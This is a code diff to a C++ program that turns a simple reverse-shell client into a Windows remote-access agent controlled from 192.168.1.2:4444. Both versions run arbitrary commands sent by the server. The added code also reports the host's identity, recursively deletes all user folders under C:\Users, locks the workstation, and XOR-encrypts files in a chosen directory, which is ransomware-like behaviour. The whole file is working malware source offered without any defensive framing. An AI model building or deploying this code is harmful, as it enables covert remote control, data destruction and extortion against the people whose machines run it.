@@ -1,177 +1,210 @@
 #include <iostream>
 #include <string>
-#include <cstdio>
-#include <cstdlib>
-#include <memory>
-#include <array>
-#include <thread>
-#include <mutex>
-#include <condition_variable>
+#include <sstream>
+#include <fstream>
+#include <filesystem>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 
-#ifdef _WIN32
-    #include <winsock2.h>  // Windows-specific networking headers
-    #include <ws2tcpip.h>
-    #include <windows.h>   // For hiding or minimizing the console window
-    #pragma comment(lib, "Ws2_32.lib")  // Link with the Winsock library
-#else
-    #include <arpa/inet.h>  // POSIX socket headers (Linux)
-    #include <sys/socket.h>
-    #include <unistd.h>
-    #include <netinet/in.h>
-#endif
-#include <string.h>
+#pragma comment(lib, "Ws2_32.lib")
 
-// Initialize networking (Winsock on Windows or nothing on Linux)
-void init_networking() {
-#ifdef _WIN32
-    WSADATA wsaData;
-    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (result != 0) {
-        std::cerr << "WSAStartup failed: " << result << std::endl;
-        exit(1);
+namespace fs = std::filesystem;
+
+SOCKET sock;
+
+// Locate the agent's current details
+std::string locate_agent() {
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+    std::ostringstream location;
+    location << "Hostname: " << hostname;
+
+    // Using getaddrinfo to fetch the IP address of the local machine
+    struct addrinfo hints, *res;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+
+    // Get the address info for the local machine
+    if (getaddrinfo(hostname, NULL, &hints, &res) == 0) {
+        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)res->ai_addr;
+        char ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip, INET_ADDRSTRLEN);
+        location << ", IP: " << ip;
+        freeaddrinfo(res);
     }
-#endif
+
+    return location.str();
 }
 
-// Clean up networking (Winsock on Windows or nothing on Linux)
-void cleanup_networking() {
-#ifdef _WIN32
-    WSACleanup();
-#endif
+// Delete all user data with enhanced error handling
+std::string clear_all_data() {
+    std::string result = "Data clearing failed.";
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator("C:\\Users\\")) {
+            try {
+                // Attempt to delete the file or directory
+                std::string path = entry.path().string();
+
+                if (fs::is_directory(entry)) {
+                    // Skip system directories that are inaccessible (e.g., Windows system folders)
+                    if (path.find("C:\\Users\\Public") != std::string::npos || path.find("C:\\Users\\Default") != std::string::npos) {
+                        continue;
+                    }
+                }
+
+                fs::remove_all(entry.path());  // Attempt to delete the file/directory
+                std::cout << "Successfully deleted: " << path << std::endl;
+
+            } catch (const std::filesystem::filesystem_error& e) {
+                // Capture specific filesystem errors like access denied or invalid argument
+                result = "Failed to delete: " + entry.path().string() + " with error: " + e.what();
+                std::cerr << "Error deleting file: " << entry.path().string() << " Error: " << e.what() << std::endl;
+                continue;  // Continue with the next file even if one fails
+            } catch (const std::exception& e) {
+                // Catch other exceptions (e.g., std::bad_alloc)
+                result = "Error during data deletion: " + std::string(e.what());
+                std::cerr << "Unexpected error: " << e.what() << std::endl;
+                continue;
+            }
+        }
+        result = "All user data cleared.";
+    } catch (const std::exception& e) {
+        result = "Error during data deletion loop: " + std::string(e.what());
+        std::cerr << "Error in data deletion loop: " << e.what() << std::endl;
+    }
+    return result;
 }
 
-// Function to execute system command and capture output (Windows version)
+// Lock the user session
+void lock_user() {
+    LockWorkStation(); // Windows API function to lock the screen
+}
+
+// Simple XOR encryption (this is a very basic form of encryption)
+void xor_encrypt_decrypt(const std::string& file_path, const std::string& key) {
+    std::ifstream in(file_path, std::ios::binary); // Ensure ifstream is correctly included
+    if (!in) {
+        return;
+    }
+
+    std::ostringstream content;
+    content << in.rdbuf(); // Read the entire file into content string
+    in.close();
+
+    // XOR the content with the key
+    std::string encrypted_content = content.str();
+    for (size_t i = 0; i < encrypted_content.size(); ++i) {
+        encrypted_content[i] ^= key[i % key.size()];
+    }
+
+    // Write the encrypted content back to the file
+    std::ofstream out(file_path, std::ios::binary);  // Ensure ofstream is correctly included
+    out.write(encrypted_content.c_str(), encrypted_content.size());
+}
+
+// Encrypt files in a directory
+void encrypt_data(const std::string& directory) {
+    const std::string key = "MySecretKey123"; // Simple key for XOR encryption
+
+    for (const auto& file : fs::recursive_directory_iterator(directory)) {
+        if (fs::is_regular_file(file)) {
+            try {
+                xor_encrypt_decrypt(file.path().string(), key);
+            } catch (...) {
+                continue;
+            }
+        }
+    }
+}
+
+// Execute a command received from the server
 std::string exec(const std::string& cmd) {
-#ifdef _WIN32
-    std::array<char, 128> buffer;
+    char buffer[128];
     std::string result;
-    std::shared_ptr<FILE> pipe(_popen(cmd.c_str(), "r"), _pclose);
-    if (!pipe) {
-        throw std::runtime_error("popen() failed!");
+    FILE* pipe = _popen(cmd.c_str(), "r");
+    if (!pipe) return "Command execution failed.";
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        result += buffer;
     }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-        result += buffer.data();
-    }
+    _pclose(pipe);
     return result;
-#else
-    std::array<char, 128> buffer;
-    std::string result;
-    std::shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
-    if (!pipe) {
-        throw std::runtime_error("popen() failed!");
-    }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-        result += buffer.data();
-    }
-    return result;
-#endif
 }
 
-// Minimize the console window on Windows
-void minimize_console() {
-#ifdef _WIN32
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_MINIMIZE);  // Minimize the console window
-#endif
-}
+// Handle commands from the server
+void handle_command(const std::string& command) {
+    int bytes_sent = 0;
+    std::string response;
 
-// Function to send the agent's IP address to the server
-void send_ip_to_server(int sock) {
-    // Get the local IP address of the agent
-    char ip[INET_ADDRSTRLEN];
-    sockaddr_in addr;
-    socklen_t addr_len = sizeof(addr);
-
-    // Get the local address (for the client side)
-    if (getsockname(sock, (struct sockaddr*)&addr, &addr_len) == 0) {
-        inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
-        send(sock, ip, strlen(ip), 0);
-    }
-}
-
-// Main function to communicate with the server and execute commands
-void communicate_with_server(const std::string& server_ip, const std::string& server_port) {
-    init_networking();
-
-    // Create socket
-    int sock;
-#ifdef _WIN32
-    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed!" << std::endl;
-        cleanup_networking();
-        return;
-    }
-#else
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        std::cerr << "Socket creation failed!" << std::endl;
-        cleanup_networking();
-        return;
-    }
-#endif
-
-    // Resolve server address
-    sockaddr_in server_address;
-    server_address.sin_family = AF_INET;
-    inet_pton(AF_INET, server_ip.c_str(), &server_address.sin_addr);
-    server_address.sin_port = htons(std::stoi(server_port));
-
-    // Connect to the server
-#ifdef _WIN32
-    if (connect(sock, reinterpret_cast<sockaddr*>(&server_address), sizeof(server_address)) == SOCKET_ERROR) {
-#else
-    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
-#endif
-        std::cerr << "Connection failed!" << std::endl;
-        cleanup_networking();
-        return;
+    if (command == "locate") {
+        std::string location = locate_agent();
+        response = location;
+    } else if (command == "clear") {
+        response = clear_all_data();
+    } else if (command == "lock") {
+        lock_user();
+        response = "User locked successfully.";
+    } else if (command.rfind("encrypt ", 0) == 0) {
+        std::string directory = command.substr(8);
+        encrypt_data(directory);
+        response = "Data encrypted successfully.";
+    } else {
+        response = exec(command);
     }
 
-    std::cout << "Connected to the server." << std::endl;
-
-    // Send the agent's IP address to the server
-    send_ip_to_server(sock);
-
-    // Minimize the console window
-    minimize_console();
-
-    // Loop to receive commands and send back results
-    while (true) {
-        char buffer[512];
-#ifdef _WIN32
-        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
-#else
-        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
-#endif
-        if (bytes_received <= 0) {
-            std::cerr << "Error or connection closed by server." << std::endl;
+    // Ensure the entire response is sent
+    while (bytes_sent < response.size()) {
+        int result = send(sock, response.c_str() + bytes_sent, response.size() - bytes_sent, 0);
+        if (result == SOCKET_ERROR) {
+            std::cerr << "Error sending response: " << WSAGetLastError() << std::endl;
             break;
         }
-        buffer[bytes_received] = '\0';  // Null-terminate the string
-
-        std::string command(buffer);
-        if (command == "exit") {
-            std::cout << "Exiting..." << std::endl;
-            break;
-        }
-
-        std::string result = exec(command);  // Execute the command
-        send(sock, result.c_str(), result.size(), 0);  // Send back the result
+        bytes_sent += result;
     }
-    #ifdef _WIN32
-        closesocket(sock);  // Close the socket
-    #else
-        close(sock);
-    #endif
-    cleanup_networking();
+
+    // Optionally, handle connection termination after a specific command
+    if (command == "exit") {
+        std::cout << "Server requested disconnect." << std::endl;
+        closesocket(sock);  // Close the socket connection if the 'exit' command is received
+        WSACleanup();       // Clean up Winsock
+    }
 }
 
 int main() {
-    std::string server_ip = "192.168.1.2";  // Server IP address
-    std::string server_port = "12345";    // Server port
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-    communicate_with_server(server_ip, server_port);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444);
+    inet_pton(AF_INET, "192.168.1.2", &server_addr.sin_addr);
 
+    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return 1;
+    }
+
+    std::cout << "Connected to server." << std::endl;
+
+    while (true) {
+        char buffer[512];
+        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
+        if (bytes_received <= 0) {
+            std::cerr << "Connection closed or error occurred." << std::endl;
+            break; // Break out of the loop if connection is closed or error occurs
+        }
+
+        buffer[bytes_received] = '\0'; // Null-terminate the received string
+        std::string command(buffer);
+
+        handle_command(command); // Handle the command received from the server
+    }
+
+    closesocket(sock); // Cleanly close the socket
+    WSACleanup();      // Clean up Winsock
     return 0;
 }
